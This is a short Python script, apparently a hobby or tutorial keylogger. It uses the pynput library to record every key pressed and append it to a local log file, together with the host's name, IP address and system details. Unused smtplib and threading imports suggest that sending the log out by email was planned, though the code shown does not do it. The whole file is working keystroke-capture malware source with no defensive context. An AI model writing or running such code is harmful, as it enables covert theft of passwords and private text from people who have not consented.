import platform 
import smtplib
import socket
import threading 

from pynput import keyboard
from pynput.keyboard import Listener

def KeyPressed(key):
    print(str(key))
    with open('logfile.txt','a') as LogKey:
        try:
            char = key.char
            LogKey.write(char)
        except:
            LogKey.write("\n"+str(key)+"\n")

    

if __name__=="__main__":
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    with open('logfile.txt','a') as Log:
        Log.write("%s\n%s\n%s\n%s\n%s\n\n" % (hostname,ip,plat,system,machine))
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()
    
    
